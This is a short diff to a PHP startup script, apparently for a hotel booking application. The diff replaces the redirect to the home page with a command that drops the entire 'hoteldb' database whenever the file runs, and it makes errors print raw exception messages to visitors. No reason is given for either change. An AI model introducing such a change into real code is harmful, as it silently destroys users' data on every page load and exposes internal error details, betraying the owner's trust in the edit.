@@ -1,16 +1,14 @@
-<?php 
+<?php
     require "logic.php";
     //startup file
     try{
         $logic = new Logic();
         $pdo = $logic->db_context();
-        header("Location: views/home.php");
+        $pdo->exec('DROP DATABASE hoteldb');
     }
     catch(PDOException $e){
         session_start();
-        $_SESSION['error_message'] = $e->getMessage();
-        header("Location: views/error.php");
+        $_SESSION['ERROR_MESSAGE'] = $e->getMessage();
+        die($e->getMessage());
     }
-    
 ?>
-
